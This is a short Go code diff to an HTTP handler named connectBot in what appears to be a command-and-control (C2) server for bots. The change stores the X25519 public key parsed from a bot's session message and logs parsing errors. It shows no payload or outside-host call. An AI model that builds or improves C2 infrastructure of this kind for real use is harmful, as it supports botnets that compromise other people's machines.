@@ -113,7 +113,11 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 
 		if msg.Type == "session" {
 			botpbbytes := msg.Message.([]byte)
-			ecdh.X25519().NewPublicKey(botpbbytes)
+			pb.PublicKey, err = ecdh.X25519().NewPublicKey(botpbbytes)
+			if err != nil {
+				log.Println("Error generating bot public key ", err)
+				return
+			}
 
 			priv, pub := session.CalculatePublicKey()
 			pb.PrivatekeyServer = priv
